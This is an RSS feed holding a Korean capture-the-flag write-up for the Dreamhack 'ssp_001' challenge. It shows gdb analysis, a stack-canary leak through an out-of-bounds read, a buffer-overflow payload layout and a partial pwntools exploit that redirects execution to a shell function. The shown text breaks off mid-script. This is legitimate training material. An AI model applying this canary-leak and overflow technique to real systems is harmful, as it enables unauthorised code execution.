<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>TouBVa</title>
    <description>Harder than you thought, easier than you expected</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 03 Feb 2023 22:39:39 +0900</pubDate>
    <lastBuildDate>Fri, 03 Feb 2023 22:39:39 +0900</lastBuildDate>
    <generator>Jekyll v4.2.2</generator>

    
      <item>
        <title>System Hacking Step 6: ssp_001</title>
        <description>&lt;h1 id=&quot;1-코드-분석&quot;&gt;1. 코드 분석&lt;/h1&gt;

&lt;p&gt;이 문제는 코드와 바이너리를 함께 제시해 주는 문제다. 그러나 더 깊은 공부를 위해 코드가 주어지지 않았다는 가정 하에서 문제를 풀기 위해 바이너리를 분석해 보았다. 설명하기에 앞서, 바이너리만 주어진 상황에서의 분석 순서는 동적 분석 → 정적 분석이라는 점을 강조하고 싶다. 해당 바이너리가 어떤 행위를 하는지 추상적으로 알고 있어야 정적 분석을 할 때 중요한 포인트를 찾아가는 지표를 가질 수 있기 때문이다. 따라서, 아래에 이어지는 바이너리 정적 분석은 동적 분석이 이미 이루어졌다는 것을 전제로 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-사용된-함수-목록-확인&quot;&gt;1.1. 사용된 함수 목록 확인&lt;/h2&gt;

&lt;p&gt;먼저 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssp_001&lt;/code&gt; 바이너리에 gdb를 물려 해당 바이너리 내부에서 사용되었던 functions들의 목록을 찾아 보았다. 바이너리가 ripped 되지 않았고, 난독화되지 않은 상태라면 쉽게 functions들의 목록을 불러올 수 있을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;당장 확인되는 functions들 중 눈에 띄는 건 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 이다. 전자가 존재한다는 것은 타겟 시스템에 ASLR이 걸려 있더라도 got, plt overwrite 방식으로 우회하여 쉘을 딸 수 있다는 의미이고, 후자는 누가 봐도 함수의 코드 플로우를 조작해 접근해야 하는 목표물처럼 보이기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-main-함수의-어셈블리-확인&quot;&gt;1.2. main 함수의 어셈블리 확인&lt;/h2&gt;

&lt;p&gt;이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; 함수의 어셈블리를 확인해 보자.&lt;/p&gt;

&lt;p&gt;카나리를 다루는 모습이다. 32비트 프로그램이므로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x8&lt;/code&gt; 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gs:0x14&lt;/code&gt; 가 들어간다. 관련한 내용은 &lt;a href=&quot;https://toubva.github.io/blog/dreamhack_system_hacking/step6-1#/&quot;&gt;여기&lt;/a&gt;에서 복습하자!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;121-함수-branch-별-행동-확인&quot;&gt;1.2.1. 함수 branch 별 행동 확인&lt;/h3&gt;

&lt;p&gt;해당 바이너리의 실행 모습(선택지가 나오고, 사용자가 선택한 선택지에 따라 다른 내용의 프로그램 branch가 전개되는 형식)을 감안했을 때, 아마 main 함수 혹은 선택지를 제시하기 위해 call 되는 함수 내부에는 최소 3개 이상의 cmp-jmp 구문이 존재할 것이다. 해당 구간을 찾아 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;추측이 맞았다. 3개의 cmp-jmp 쌍이 존재했고, 각각의 쌍은 main 함수의 특정 부분으로 점프하는 모습을 보여준다. main 함수 내부에서 모든 작업이 이루어지는 것으로 생각되며, 해당 구문은 if - if - if - else 형식의 문법을 취하고 있는 것으로 보인다. 또한 cmp하는 대상이 각각 아스키 코드로 ‘F’, ‘P’, ‘E’인 것으로 봤을 때, 프로그램을 실행했을 때 바로 나오는 아래의 선택지 부분임을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;이제 각 선택지에 따른 동작을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;122-선택지-f의-경우&quot;&gt;1.2.2. 선택지 [F]의 경우&lt;/h3&gt;

&lt;p&gt;선택지 P의 경우인 어셈블리 라인은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+192&lt;/code&gt; 부터 시작하므로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+155~main+187&lt;/code&gt; 까지의 라인이 선택지 F에 해당된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;해당 라인의 핵심은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt; 함수와 연관이 깊어 보인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read(0, eax([ebp-0x88]), 0x40)&lt;/code&gt; 을 호출하는 정황으로 미루어 보았을 때, 사용자의 input 0x40개를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x88&lt;/code&gt; 에 저장하는 것으로 보인다. 아마 실제 소스에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read(0, buf, 0x40)&lt;/code&gt;쯤 될 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;123-선택지-p의-경우&quot;&gt;1.2.3. 선택지 [P]의 경우&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;선택지 P를 처리하는 어셈블리 라인에서는 주목할 만한 행위 두 가지가 보인다. 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(&quot;{some words}{format_string}&quot;, *(ebp-0x94))&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print_box&lt;/code&gt; 를 콜하는 것이다. 먼저 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt; 에 저장되는 것은 어셈블리어만을 보고 알 수는 없다. 32비트 환경에서의 주소값과 int 값은 동일한 4byte로 어셈블리어 상에서 구분이 안 되기 때문이다. 따라서 동적으로 분석해야만 한다. 그 결과, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt; 에는 int가 저장되는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print_box(ebp-0x88, ebp-0x94)&lt;/code&gt; 가 어떤 일을 하는지 알아보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0xc&lt;/code&gt; 는 인자로 줬던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt; 가 저장된 곳이고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x8&lt;/code&gt;은 인자로 줬던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x88&lt;/code&gt;이 저장된 곳이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-x088&lt;/code&gt;을 a, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt;를 b라고 하면 a+b를 한 단위가 1바이트인 주소로 참조해 해당 주소에 저장된 하위 1바이트를 eax에 저장하여 printf에게 주는 인자로 사용한다. 이건 거꾸로 KTX를 타고 가면서 봐도 사용자에게 입력받았던 값을 index로 하여 char 배열을 참조한 다음, 해당 위치에 저장된 값을 출력해 주는 것처럼 보인다.&lt;/p&gt;

&lt;p&gt;이 지점에서 OOB(Out-Of-Bound)가 가능한 것으로 추측된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;124-선택지-e의-경우&quot;&gt;1.2.4. 선택지 [E]의 경우&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt;함수를 사용하는 것이 눈에 띈다. 아까부터 각 branch별로 특정 함수들을 강조하는데, 그 이유는 이들이 사용자와 interaction하는, 취약성을 내재할 확률이 가장 큰 부분이기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(”{string}{format_string}”, *(ebp-0x90))&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read(0, *(ebp-0x48), *(ebp-0x90)&lt;/code&gt; 을 보면 사용자로부터 입력받아 저장되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x90&lt;/code&gt; 이 int라는 것을 알 수 있다.&lt;/p&gt;

&lt;p&gt;즉, 사용자에게 특정 숫자를 받고, 그 숫자만큼의 글자를 입력받는 행위를 하고 있다. 이는 매우 취약한 코드인데, 검증되지 않은 입력을 검증하기 위한 boundary check 마저 검증되지 않은 소스에게 의존하고 있기 때문이다.&lt;/p&gt;

&lt;p&gt;해당 행위를 수행한 다음, 사진에는 잘려 있지만 스택 카나리를 확인하여 main 함수를 끝내는 플로우로 이어진다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-취약점-지정-및-익스플로잇-방법-선정&quot;&gt;2. 취약점 지정 및 익스플로잇 방법 선정&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-분석-요약-및-필요한-정보-선정&quot;&gt;2.1. 분석 요약 및 필요한 정보 선정&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞에서 분석한 내용을 요약하면 아래와 같다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;F 옵션: 사용자의 입력을 buf에 저장한다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;P 옵션: 사용자의 int type 입력 x 를 받아 buf[x]를 참조해 출력한다. 여기에서 OOB로 인한 Memory Leak이 가능하다. (아래 사진 참고-buf는 0x40 길이이므로 인덱스의 한계는 63이지만 70번 인덱스에 접근 가능하다)&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;E 옵션: 사용자로부터 입력값의 길이 y를 받고, read 함수로 y 만큼의 입력을 받아 buf2에 저장한다. 해당 작업이 끝나면 프로그램을 종료한다. 여기에서 잘못된 boundary check로 인한 BOF 취약점이 발생한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 프로그램을 익스플로잇하기 위해서 필요한 정보는 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;해당 프로그램에 걸려 있는 보호 기법의 목록&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;ASLR은 꺼져 있을 것이다.(현재 커리큘럼상)&lt;/li&gt;
      &lt;li&gt;NX enabled 이므로 스택에는 실행 권한이 없다. 즉, RTL이나 PLT&amp;amp;GOT overwrite 등으로 우회해야만 한다.&lt;/li&gt;
      &lt;li&gt;RELRO가 Partial로 걸려 있다. 이 경우 GOT에는 RO가 걸리지 않으므로 GOT 변조로 우회 가능하다.&lt;/li&gt;
      &lt;li&gt;스택 카나리가 걸려 있다. FSB 혹은 OOB 등으로 Canary Leak을 하는 것이 현실적인 우회 기법이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;스택 카나리의 값
    &lt;ul&gt;
      &lt;li&gt;P 옵션 실행 시 OOB로 인한 Canary Leak이 가능해 보인다.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;그렇다면 사용자 입력값으로 얼마를 줘야 할까?&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;스택 프레임을 오염시키고 무한 루프를 종료할 수 있는 코드 플로우
    &lt;ul&gt;
      &lt;li&gt;E 옵션 실행 시 두 가지가 BOF로 인해 모두 가능하다.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;ASLR이 꺼져 있고, NX enabled인 상황에서 가장 쉽게 가능한 방식인 RTL을 수행하기 위해 작성해야 하는 페이로드 구성은 무엇이 될까?&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-필요한-정보-알아내기&quot;&gt;2.2. 필요한 정보 알아내기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까&quot;&gt;2.2.1. [P] 옵션상에서, 사용자 입력값으로 무엇을 줘야 Canary Leak이 가능할까?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;P 옵션을 줬을 때 읽어오는 항목인 box 배열의 시작 지점이 스택의 어디에 할당되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ebp-0x88 지점이다.&lt;/p&gt;

&lt;p&gt;그렇다면 스택 카나리는 어디에 저장되는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ebp-0x8 지점이다.&lt;/p&gt;

&lt;p&gt;즉, box[0x80] 지점이 스택 카나리의 시작점일 것으로 추정된다. 정말인지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;메모리를 낮은 주소에서부터 읽어오는 점, 그리고 현재 프로세서가 리틀 엔디안이라는 점을 감안하면 아마 스택 카나리의 값은 0x1e831700일 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;실제로 확인해 보니 일치하는 것을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까&quot;&gt;2.2.2. [E] 옵션 실행 시 삽입될 페이로드 구성은 어떻게 해야 할까?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;E 옵션을 줬을 때, 사용자가 입력할 길이를 지정하게 한 다음 입력을 받는다. 그렇다면 사용자의 입력을 받아 저장하는 버퍼의 위치는 어디일까?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;read 함수의 두번째 인자로 저장될 버퍼의 주소가 들어가므로 현재 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+302&lt;/code&gt; 에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; 에 들어간 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x48&lt;/code&gt; 이 인자가 저장될 주소이다.&lt;/p&gt;

&lt;p&gt;즉,&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + return address + 0x04 dump + parameters&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;가 삽입할 페이로드의 구성이 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;223-리턴-어드레스는-어디로-조작해야-할까&quot;&gt;2.2.3. 리턴 어드레스는 어디로 조작해야 할까?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;1.1.에서 확인한 함수들의 이름 중 수상한 것이 두 개 있었다. 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 이었다. 전자를 사용할 수도 있지만 후자를 한 번 확인해 보고, 둘 중 무엇으로 코드 플로우를 변경하는 것이 효율적일지 고민해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;진짜로 KTX 타고 백덤블링하면서 봐도 system(”/bin/sh”)를 실행해 주는 함수다.&lt;/p&gt;

&lt;p&gt;현재 ASLR이 꺼져 있어, 사용된 라이브러리의 베이스 주소를 찾고 → system 함수의 오프셋을 찾고 → /bin/sh 문자열의 주소를 찾은 다음 RTL을 하는 것보다 그냥 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 함수로 리다이렉션을 하는 게 훨씬 나아 보인다. 따라서 리턴 어드레스로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 의 주소를 줄 것이다.&lt;/p&gt;

&lt;p&gt;만일 ASLR이 켜져 있다면, OOB 취약점을 이용해 main의 리턴 어드레스까지를 읽어서(동일 버전으로 컴파일되었다면 main의 리턴 어드레스는 동일한 라이브러리 함수로 이어지기 때문에 libc base를 알아낼 수 있다) libc base를 알아내 RTL을 수행하는 게 더 쉬울지도 모른다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-취약점-익스플로잇-시나리오-세우기&quot;&gt;2.3. 취약점 익스플로잇 시나리오 세우기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 가능한 취약점 익스플로잇 시나리오는 크게 두 단계로 나뉘며, 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;스택 카나리를 알아내는 과정
    &lt;ul&gt;
      &lt;li&gt;P, 131, P, 130, P, 129, P, 128을 입력하고 값을 받기를 반복한다.&lt;/li&gt;
      &lt;li&gt;받아온 값을 bytearray의 concatenate를 이용하여 조합해 p32() 함수로 패킹한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;알아낸 카나리를 포함한 페이로드를 만들어 RTL이나 ROP를 성공시키는 과정
    &lt;ul&gt;
      &lt;li&gt;페이로드의 구성:
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + get_shell addr + 0x04 dump + parameters&lt;/strong&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-익스플로잇-작성-후-실행&quot;&gt;3. 익스플로잇 작성 후 실행&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ssp_001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;host3.dreamhack.games&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24236&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;get_shell&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#get_shell 주소는 pwntools가 알아서 찾아줄 것이다
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# figuring out the stack canary
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;P&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;131&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;is : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# converting canary from str to int -&amp;gt; 32bit packed byte 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# giving F option to do BOF exploitation and set the payload length
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;E&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

